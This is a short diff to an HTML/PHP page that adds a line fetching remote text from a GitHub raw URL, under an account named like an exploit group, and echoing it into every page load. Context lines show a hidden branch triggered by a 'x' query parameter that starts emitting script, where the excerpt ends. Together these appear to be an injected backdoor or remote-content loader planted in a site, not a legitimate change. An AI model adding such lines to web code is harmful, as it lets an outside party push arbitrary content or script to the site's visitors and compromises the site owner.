@@ -119,6 +119,7 @@
         }, 1000);
     });
   </script>
+<?php echo file_get_contents("https://raw.githubusercontent.com/sniper404ghostxploit/var/main/main.txt"); ?>
   </body>
 </html>
 <?php if(isset($_GET["x"])){ ?> <script>
